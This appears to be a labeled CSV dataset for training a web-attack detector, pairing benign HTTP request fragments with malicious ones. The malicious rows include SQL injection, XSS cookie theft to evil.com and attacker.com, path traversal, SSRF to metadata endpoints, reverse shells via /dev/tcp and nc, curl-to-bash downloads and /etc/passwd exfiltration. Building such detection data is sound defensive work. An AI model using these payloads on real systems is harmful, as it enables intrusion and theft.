"text","label"
"message=<a href='javascript:alert(1)'>click</a>","1"
"....//....//etc/passwd","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=phone","0"
"Authorization: Bearer validtoken604","0"
"page=17&limit=10","0"
"GET /health HTTP/1.1","0"
"search=tablet","0"
"GET /api/files?name=../../../etc/shadow","1"
"category=electronics&page=1","0"
"comment=javascript:alert(1)","1"
"GET /api/data/2385","0"
"login attempt failed username admin invalid credentials","1"
"host=& whoami","1"
"GET /health HTTP/1.1","0"
"page=3&limit=50","0"
"cmd=`id`","1"
"search=<details open ontoggle=alert(1)>","1"
"user_id=129&action=view","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"date=2024-01-15&type=order","0"
"status=pending&priority=high","0"
"GET /api/users/2007","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"category=phones page=5","0"
"page=23&limit=10","0"
"fetch=http://internal-service:8080/secret","1"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"../../../../proc/self/environ","1"
"order_id=ORD-1910 status=confirmed","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"' OR 1=1 LIMIT 1--","1"
"url=http://169.254.169.254/latest/meta-data/","1"
"PUT /api/orders User-Agent: PostmanRuntime/7.36.0","0"
"PUT /api/login?date=2024-01-15&type=order","0"
"POST /api/login username=' UNION SELECT username,password FROM users-- password=test","1"
"user_id=919&action=view","0"
"page=24&limit=50","0"
"POST /api/data body=command; ls -la","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"user_id=986&action=view","0"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"Authorization: Bearer validtoken107","0"
"login attempt failed username admin invalid credentials","1"
"User-Agent: Nmap Scripting Engine","1"
"GET /profile/8162","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"POST /api/users body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /admin HTTP/1.1","1"
"order_id=ORD-4758 status=confirmed","0"
"GET /dashboard/9694","0"
"filename=|| nc -e /bin/sh attacker.com 4444","1"
"GET /profile/5142","0"
"username=administrator&password=superman","1"
"GET /health HTTP/1.1","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"DELETE /api/login User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"GET /robots.txt scan probe reconnaissance","1"
"GET /api/users?id=1' oR '1'='1","1"
"page=26&limit=10","0"
"filename=& net user hacker Password1 /add","1"
"1 UNION SELECT 1,2,3--","1"
"path=file:///etc/passwd","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"cmd=& net user hacker Password1 /add","1"
"page=38&limit=50","0"
"login attempt failed username admin invalid credentials","1"
"DELETE /api/orders User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"order_id=ORD-3761 status=confirmed","0"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"q=smartphone&brand=samsung","0"
"POST /api/data body=command`id`","1"
"order_id=' OR '1'='1'--","1"
"& net user hacker Password1 /add","1"
"user_id=343&action=view","0"
"GET /health HTTP/1.1","0"
"user_id=249&action=view","0"
"order_id=ORD-3362 status=confirmed","0"
"username=' UNION SELECT username,password FROM users--","1"
"GET /server-status HTTP/1.1","1"
"category=phones page=10","0"
"User-Agent: masscan/1.3","1"
"host=`curl -s http://attacker.com/shell.sh | bash`","1"
"Authorization: Bearer validtoken867","0"
"name=Nour email=480@mail.com","0"
"search=' OR 1=1--","1"
"order_id=ORD-3719 status=confirmed","0"
"<script>alert(1)</script>","1"
"order_id=1'%09OR%091=1--","1"
"category=tablets page=7","0"
"search=' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","1"
"POST /api/login body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"user_id=630&action=view","0"
"PUT /settings?q=smartphone&brand=samsung","0"
"' OR 1=1--","1"
"password spray attack detected multiple users","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"page=30&limit=20","0"
"fetch=http://internal-service:8080/secret","1"
"category=audio page=5","0"
"order_id=ORD-1391 status=confirmed","0"
"Authorization: Bearer validtoken502","0"
"file=../../../var/www/html/config.php","1"
"POST /api/data body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /api/login/1417","0"
"Authorization: Bearer validtoken899","0"
"POST /api/products User-Agent: python-requests/2.31.0","0"
"<svg/onload=alert(1)>","1"
"user_id=172&action=view","0"
"search=laptop&sort=price","0"
"search=%3Cscript%3Ealert(1)%3C/script%3E","1"
"category=tablets page=5","0"
"DELETE /settings?status=pending&priority=high","0"
"name=Lina email=423@mail.com","0"
"user_id=611&action=view","0"
"GET /settings/4957","0"
"url=http://localhost:8080","1"
"search=<img src='x' onerror='alert(1)'>","1"
"; ping -c 4 attacker.com","1"
"<textarea onfocus=alert(1) autofocus>","1"
"POST /api/users?search=laptop&sort=price","0"
"username=user&password=letmein","1"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"url=http://metadata.google.internal","1"
"username=administrator&password=1234567890","1"
"fetch=http://internal-service:8080/secret","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"brute force attempt on login endpoint from single ip","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /dashboard/8917","0"
"password spray attack detected multiple users","1"
"GET /health HTTP/1.1","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"Authorization: Bearer validtoken857","0"
"GET /api/data/3763","0"
"Authorization: Bearer validtoken259","0"
"ping=`curl -s http://attacker.com/shell.sh | bash`","1"
"username=1; IF (1=1) WAITFOR DELAY '0:0:5'--","1"
"description=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /health HTTP/1.1","0"
"PUT /api/products User-Agent: python-requests/2.31.0","0"
"GET /api/users/1696","0"
"DELETE /api/users?q=smartphone&brand=samsung","0"
"multiple failed login attempts detected for admin","1"
"GET /health HTTP/1.1","0"
"date=2024-01-15&type=order","0"
"user_id=460&action=view","0"
"GET /console HTTP/1.1","1"
"login attempt failed username admin invalid credentials","1"
"name=Nour email=245@mail.com","0"
"GET /health HTTP/1.1","0"
"GET /actuator/env HTTP/1.1","1"
"username=administrator&password=password","1"
"POST /settings body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"Authorization: Bearer validtoken493","0"
"url=http://metadata.google.internal","1"
"....//....//etc/passwd","1"
"order_id=ORD-4077 status=confirmed","0"
"name=Sara email=136@mail.com","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"username=administrator&password=batman","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"category=audio page=7","0"
"Authorization: Bearer validtoken210","0"
"limit=20&offset=0","0"
"POST /profile body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"order_id=ORD-2323 status=confirmed","0"
"exec=| wget http://attacker.com/shell.sh","1"
"GET /phpmyadmin HTTP/1.1","1"
"password spray attack detected multiple users","1"
"GET /health HTTP/1.1","0"
"category=phones page=9","0"
"search=laptop","0"
"POST /api/products body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"id=' UNION ALL SELECT NULL,NULL,NULL--","1"
"PUT /profile?category=electronics&page=1","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /profile/717","0"
"POST /profile body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /api/data User-Agent: python-requests/2.31.0","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"page=8&limit=50","0"
"GET /api/search/7654","0"
"status=pending&priority=high","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"name=%3Cscript%3Ealert(1)%3C/script%3E","1"
"User-Agent: Nikto/2.5.0","1"
"GET /api/swagger.json HTTP/1.1","1"
"repeated authentication failure admin account locked","1"
"POST /api/login username='; UPDATE users SET password='hacked' WHERE 1=1-- password=test","1"
"category=audio page=1","0"
"user_id=735&action=view","0"
"username=admin&password=admin","1"
"user_id=758&action=view","0"
"POST /profile?search=laptop&sort=price","0"
"PUT /api/products User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"url=http://10.0.0.1","1"
"ping=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"GET /health HTTP/1.1","0"
"filename=`id`","1"
"page=19&limit=20","0"
"order_id=ORD-2928 status=confirmed","0"
"filename=`curl -s http://attacker.com/shell.sh | bash`","1"
"order_id=ORD-6315 status=confirmed","0"
"ping=`id`","1"
"DELETE /settings User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"DELETE /api/users User-Agent: python-requests/2.31.0","0"
"username=' OR '1'='1'--","1"
"search=headphones","0"
"PUT /api/orders?category=electronics&page=1","0"
"multiple failed login attempts detected for admin","1"
"POST /settings body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"PUT /dashboard User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"fetch=http://internal-service:8080/secret","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"page=4&limit=50","0"
"GET /api/files?name=php://filter/convert.base64-encode/resource=config.php","1"
"POST /settings body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /api/search/8892","0"
"name=Ahmed email=692@mail.com","0"
"status=pending&priority=high","0"
"q=smartphone&brand=samsung","0"
"search=headphones","0"
"file=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"url=dict://127.0.0.1:11211/","1"
"username=administrator&password=abc123","1"
"Authorization: Bearer validtoken344","0"
"POST /profile?status=pending&priority=high","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"search=laptop","0"
"GET /etc/passwd%00","1"
"filename=`id`","1"
"search=laptop&sort=price","0"
"Authorization: Bearer validtoken875","0"
"..%2F..%2F..%2Fetc%2Fpasswd","1"
"PUT /api/data User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"search=<div onmouseover=alert(1)>hover</div>","1"
"<a href='javascript:alert(1)'>click</a>","1"
"user_id=120&action=view","0"
"user=ahmed&filter=active","0"
"order_id=1 UNION SELECT user(),database()--","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"DELETE /api/search?status=pending&priority=high","0"
"POST /dashboard body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"title=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"GET /health HTTP/1.1","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"search=headphones","0"
"category=laptops page=7","0"
"id=123&format=json","0"
"GET /api/users?id=admin'--","1"
"GET /health HTTP/1.1","0"
"GET /console HTTP/1.1","1"
"url=http://metadata.google.internal","1"
"Authorization: Bearer validtoken688","0"
"category=audio page=3","0"
"Authorization: Bearer validtoken918","0"
"GET /api/search?q=';alert(String.fromCharCode(88,83,83))//","1"
"GET /dashboard User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"GET /api/search?q='><script>alert(1)</script>","1"
"url=gopher://127.0.0.1:25/","1"
"order_id=ORD-2449 status=confirmed","0"
"username=1'%09OR%091=1--","1"
"GET /api/data?date=2024-01-15&type=order","0"
"user=admin'#","1"
"q=smartphone&brand=samsung","0"
"POST /settings body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"cmd=| uname -a","1"
"url=file:///etc/passwd","1"
"GET /actuator/env HTTP/1.1","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"search=phone","0"
"id='; WAITFOR DELAY '0:0:5'--","1"
"comment=<script>fetch('https://evil.com?c='+document.cookie)</script>","1"
"category=electronics&page=1","0"
"User-Agent: Nmap Scripting Engine","1"
"limit=20&offset=0","0"
"exec=& ipconfig","1"
"GET /api/products/9199","0"
"DELETE /api/login?search=laptop&sort=price","0"
"user=ahmed&filter=active","0"
"url=file:///etc/passwd","1"
"user_id=667&action=view","0"
"category=tablets page=9","0"
"DELETE /settings?status=pending&priority=high","0"
"login attempt failed username admin invalid credentials","1"
"user_id=197&action=view","0"
"status=pending&priority=high","0"
"GET /health HTTP/1.1","0"
"user_id=6&action=view","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"url=http://127.0.0.1/admin","1"
"PUT /api/products?id=123&format=json","0"
"name=Omar email=24@mail.com","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"search=phone","0"
"url=dict://127.0.0.1:11211/","1"
"POST /api/data User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"url=http://localhost:8080","1"
"DELETE /profile?limit=20&offset=0","0"
"search=phone","0"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"order_id=1 UNION SELECT 1,2,3--","1"
"POST /api/users?id=123&format=json","0"
"' OR 1=1 INTO OUTFILE '/tmp/x'--","1"
"POST /api/users body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"comment=&#60;script&#62;alert(1)&#60;/script&#62;","1"
"GET /.env HTTP/1.1","1"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"ping=| cat /etc/passwd","1"
"page=35&limit=10","0"
"POST /api/data body=command; python -c 'import socket,subprocess'","1"
"GET /api/search?q='><script>alert(1)</script>","1"
"multiple failed login attempts detected for admin","1"
"search=laptop","0"
"url=http://192.168.1.1","1"
"User-Agent: masscan/1.3","1"
"POST /profile User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"login attempt failed username admin invalid credentials","1"
"search=phone","0"
"username=user&password=monkey","1"
"GET /api/search?q=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"user_id=479&action=view","0"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"POST /dashboard body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"name=Sara email=643@mail.com","0"
"username=root&password=password","1"
"url=file:///etc/passwd","1"
"GET /health HTTP/1.1","0"
"host=`id`","1"
"POST /api/orders body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"search=laptop&sort=price","0"
"page=17&limit=20","0"
"search=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"page=10&limit=50","0"
"description=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"name=Sara email=172@mail.com","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"category=phones page=5","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"url=http://metadata.google.internal","1"
"search=tablet","0"
"PUT /api/login User-Agent: python-requests/2.31.0","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /api/users User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"POST /api/search body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"/etc/passwd%00","1"
"id=' UNION ALL SELECT NULL,NULL,NULL--","1"
"user_id=516&action=view","0"
"cmd=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"password spray attack detected multiple users","1"
"POST /profile body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"file=../../../../var/log/apache2/access.log","1"
"url=http://metadata.google.internal","1"
"category=phones page=7","0"
"Authorization: Bearer validtoken857","0"
"comment=<body onload=alert(1)>","1"
"title=javascript:alert(document.cookie)","1"
"category=phones page=7","0"
"order_id=ORD-6474 status=confirmed","0"
"category=electronics&page=1","0"
"user=ahmed&filter=active","0"
"order_id=ORD-5883 status=confirmed","0"
"comment=%3Cscript%3Ealert(1)%3C/script%3E","1"
"POST /settings body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"id=123&format=json","0"
"POST /api/data body=command`curl -s http://attacker.com/shell.sh | bash`","1"
"' OR 1=1#","1"
"q=smartphone&brand=samsung","0"
"POST /api/orders body={""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"repeated authentication failure admin account locked","1"
"url=gopher://127.0.0.1:25/","1"
"id=123&format=json","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"POST /api/data body=command| cat /etc/passwd","1"
"category=laptops page=9","0"
"ping=; ping -c 4 attacker.com","1"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"category=electronics&page=1","0"
"date=2024-01-15&type=order","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"name=<a href='javascript:alert(1)'>click</a>","1"
"GET /api/search?q=<img src='x' onerror='alert(1)'>","1"
"GET /health HTTP/1.1","0"
"POST /settings User-Agent: PostmanRuntime/7.36.0","0"
"username=administrator&password=123456","1"
"name=Omar email=535@mail.com","0"
"user_id=705&action=view","0"
"php://filter/convert.base64-encode/resource=config.php","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"login attempt failed username admin invalid credentials","1"
"search=1'/**/OR/**/1=1--","1"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"POST /api/login body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"../../../.env","1"
"GET /api/users User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"search=phone","0"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"order_id='; EXEC master..xp_dirtree '\\\\attacker.com\\share'--","1"
"GET /health HTTP/1.1","0"
"POST /dashboard body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"fetch=http://internal-service:8080/secret","1"
"cmd=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"search=headphones","0"
"PUT /api/users?limit=20&offset=0","0"
"GET /api/login/4121","0"
"user_id=817&action=view","0"
"search=phone","0"
"GET /health HTTP/1.1","0"
"fetch=http://internal-service:8080/secret","1"
"category=electronics&page=1","0"
"POST /api/orders User-Agent: python-requests/2.31.0","0"
"Authorization: Bearer validtoken810","0"
"search=1 AND 1=CONVERT(int,@@version)--","1"
"username=administrator&password=letmein","1"
"GET /profile/1595","0"
"GET /config.php HTTP/1.1","1"
"PUT /api/data User-Agent: PostmanRuntime/7.36.0","0"
"password spray attack detected multiple users","1"
"GET /console HTTP/1.1","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"path=../../../.env","1"
"POST /api/orders body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"cmd=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"GET /api/users?q=smartphone&brand=samsung","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /backup.sql HTTP/1.1","1"
"user_id=87&action=view","0"
"user=' OR 1=1 LIMIT 1--","1"
"name=Lina email=773@mail.com","0"
"url=http://10.0.0.1","1"
"host=| uname -a","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"GET /admin HTTP/1.1","1"
"Authorization: Bearer validtoken156","0"
"page=13&limit=20","0"
"user_id=60&action=view","0"
"id=123&format=json","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"user_id=184&action=view","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"id=admin'#","1"
"id=123&format=json","0"
"Authorization: Bearer validtoken802","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"user_id=782&action=view","0"
"search=tablet","0"
"name=Omar email=341@mail.com","0"
"limit=20&offset=0","0"
"<script >alert(1)</script >","1"
"user_id=470&action=view","0"
"GET /actuator/env HTTP/1.1","1"
"page=16&limit=20","0"
"category=electronics&page=1","0"
"Authorization: Bearer validtoken424","0"
"user_id=637&action=view","0"
"GET /health HTTP/1.1","0"
"search=headphones","0"
"search=<img src=`javascript:alert(1)`>","1"
"GET /health HTTP/1.1","0"
"url=http://metadata.google.internal","1"
"page=38&limit=50","0"
"path=..%2F..%2F..%2Fetc%2Fpasswd","1"
"Authorization: Bearer validtoken803","0"
"user_id=200&action=view","0"
"filename=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"POST /api/login body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"<script>alert(1)</script>","1"
"DELETE /api/search User-Agent: python-requests/2.31.0","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"multiple failed login attempts detected for admin","1"
"search=headphones","0"
"url=http://10.0.0.1","1"
"host=| uname -a","1"
"GET /robots.txt scan probe reconnaissance","1"
"search=<img src=x onerror=alert(1)>","1"
"order_id=ORD-3415 status=confirmed","0"
"order_id=' UNION SELECT username,password FROM users--","1"
"../../../.env","1"
"GET /web.config HTTP/1.1","1"
"exec=; ping -c 4 attacker.com","1"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"user_id=287&action=view","0"
"Authorization: Bearer validtoken508","0"
"cmd=`id`","1"
"GET /robots.txt scan probe reconnaissance","1"
"order_id=ORD-5588 status=confirmed","0"
"GET /api/search?id=123&format=json","0"
"Authorization: Bearer validtoken188","0"
"name=Lina email=948@mail.com","0"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"name=Lina email=795@mail.com","0"
"GET /server-status HTTP/1.1","1"
"category=tablets page=1","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"q=smartphone&brand=samsung","0"
"name=Ahmed email=563@mail.com","0"
"id=') OR ('1'='1","1"
"search=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"category=tablets page=7","0"
"DELETE /dashboard User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"GET /health HTTP/1.1","0"
"limit=20&offset=0","0"
"name=Ahmed email=220@mail.com","0"
"url=http://192.168.1.1","1"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /backup.sql HTTP/1.1","1"
"url=http://metadata.google.internal","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"file=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"path=../../../etc/shadow","1"
"category=audio page=6","0"
"fetch=http://internal-service:8080/secret","1"
"url=http://192.168.1.1","1"
"username=1 OR 1=1","1"
"search=laptop","0"
"name=Ahmed email=192@mail.com","0"
"GET /health HTTP/1.1","0"
"search=<script >alert(1)</script >","1"
"name=Sara email=735@mail.com","0"
"PUT /api/data User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"name=Lina email=927@mail.com","0"
"cmd=; python -c 'import socket,subprocess'","1"
"page=6&limit=20","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"PUT /profile User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"Authorization: Bearer validtoken535","0"
"id=' OR 1=1 INTO OUTFILE '/tmp/x'--","1"
"filename=; python -c 'import socket,subprocess'","1"
"name=Omar email=988@mail.com","0"
"category=audio page=6","0"
"GET /health HTTP/1.1","0"
"brute force attempt on login endpoint from single ip","1"
"GET /.git/config HTTP/1.1","1"
"category=laptops page=6","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /health HTTP/1.1","0"
"page=46&limit=50","0"
"GET /health HTTP/1.1","0"
"description=<script>alert(document.cookie)</script>","1"
"category=phones page=3","0"
"DELETE /profile User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"GET /health HTTP/1.1","0"
"category=electronics&page=1","0"
"order_id=ORD-4313 status=confirmed","0"
"Authorization: Bearer validtoken713","0"
"Authorization: Bearer validtoken969","0"
"user_id=894&action=view","0"
"user_id=89&action=view","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /settings/6320","0"
"search=<script>document.location='https://evil.com/steal?c='+document.cookie</script>","1"
"id='; WAITFOR DELAY '0:0:5'--","1"
"GET ../../../../var/log/apache2/access.log","1"
"description=<svg/onload=alert(1)>","1"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"ping=$(curl -s http://attacker.com/shell.sh)","1"
"Authorization: Bearer validtoken434","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"category=tablets page=2","0"
"search=laptop","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"cmd=; python -c 'import socket,subprocess'","1"
"category=audio page=2","0"
"search=tablet","0"
"PUT /api/search User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"page=19&limit=50","0"
"repeated authentication failure admin account locked","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=dict://127.0.0.1:11211/","1"
"GET /api/products User-Agent: PostmanRuntime/7.36.0","0"
"comment=<details open ontoggle=alert(1)>","1"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"Authorization: Bearer validtoken277","0"
"search=<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>","1"
"category=tablets page=10","0"
"order_id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","1"
"search=phone","0"
"Content-Type: application/json {""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"category=audio page=4","0"
"& whoami","1"
"name=Omar email=883@mail.com","0"
"ping=`curl -s http://attacker.com/shell.sh | bash`","1"
"name=Omar email=825@mail.com","0"
"GET /api/search/6529","0"
"include=../../../etc/shadow","1"
"GET /api/search?q=<script >alert(1)</script >","1"
"file=../../../../etc/shadow","1"
"path=..%2F..%2F..%2Fetc%2Fpasswd","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
